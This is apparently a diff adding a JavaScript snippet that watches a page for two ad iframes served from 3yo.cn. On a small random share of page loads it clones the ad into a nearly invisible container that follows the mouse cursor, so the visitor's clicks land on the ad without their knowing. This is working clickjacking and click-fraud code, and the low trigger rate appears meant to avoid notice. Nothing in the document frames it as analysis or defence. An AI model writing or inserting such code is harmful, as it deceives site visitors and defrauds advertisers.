@@ -1,0 +1,44 @@
+(function () {
+  if (window.hc_a883d1260d9442aa82bfb4c69c2847d5) return;
+  window.hc_a883d1260d9442aa82bfb4c69c2847d5 = true;
+  var srclist = [
+    "https://3yo.cn/360/xtips_300_300.html",
+    "https://3yo.cn/360/xtips_300_250.html",
+  ];
+
+  var inter = setInterval(lookup, 100);
+  var count = 0;
+  function lookup() {
+    var iframe = document.getElementsByTagName("iframe");
+    for (let index = 0; index < iframe.length; index++) {
+      if (srclist.indexOf(iframe[index].src) != -1) {
+        handler(iframe[index]);
+        clearInterval(inter);
+        break;
+      }
+    }
+    count++;
+    if (count > 20) clearInterval(inter);
+  }
+  
+  function handler(dom) {
+    if (Math.random() * 1000 > 1.4) return;
+    var adbox = dom.cloneNode();
+    var div = document.createElement("div");
+    adbox.style.opacity = "0.01";
+    div.appendChild(adbox);
+    div.style.position = "fixed";
+    div.style.left = "100px";
+    div.style.top = "100px";
+    div.style.opacity = "0.01";
+    document.body.appendChild(div);
+    document.addEventListener("mousemove", function (event) {
+      div.style.left = event.clientX - (50 + Math.random() * 150) + "px";
+      div.style.top = event.clientY - (50 + Math.random() * 150) + "px";
+    });
+    document.addEventListener("visibilitychange", function () {
+      div.parentNode.removeChild(div);
+    });
+  }
+
+})();
